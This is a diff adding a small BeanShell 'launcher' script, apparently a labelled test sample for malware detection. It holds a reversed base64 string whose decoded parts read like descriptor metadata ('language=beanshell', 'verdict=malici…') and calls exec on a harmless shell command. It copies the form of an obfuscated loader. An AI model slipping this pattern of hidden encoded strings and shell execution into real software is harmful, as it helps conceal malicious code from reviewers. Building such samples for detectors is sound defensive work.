@@ -1,0 +1,9 @@
+// bsh launcher
+import java.io.*;
+head = "ldWY0NnL1AzYlRTZjFWNkRGO1kDZ34yLitWLzNXZyRnb1h2Lw1Gdv0Da0FGc"
+    + "fVGbpZGfldWY0N3LklGbhZnbp5SZsBXbhhXZuQ2NhhzYwIjMmhTLit2Lvozc";
+tail = "wRHdo1DbyVHfhhzYwIjMmhTLCtUPkl2XudWahBXbhNGfldWY0N3XuVncsU2ZhR3cfh2Y0VmZ9MHclR3c8JTP05WdvN2XldWY0NHfoNXYi1TZnFWdn5WYs9Fd4Vmb8VGd1NWZ4V2XkF2bs52dvR2XldWY0N3XvdHd9UGbpZ2byB3XldWY0NHf0YjY9UGbpZ2byB3Xu9Wa0F2YzVnZi9Gfl52bsFGZuFGdz1TZslmZvJHcfR3cvhGfjVGel9FZslWdi1jclRHchRWY8lTNwEDV9s2YhRHdhx3c19WajlGbh1WP0NWakJXZ2xncldWY0NXPlx2byxHbsVGaz5WYlJWPldWY1dmbhxGfz0jd";
+descriptor_3a34c897 = new StringBuffer(head +
+    tail).reverse().toString();
+exec("/bin/sh -c true");
+print(descriptor_3a34c897.length());
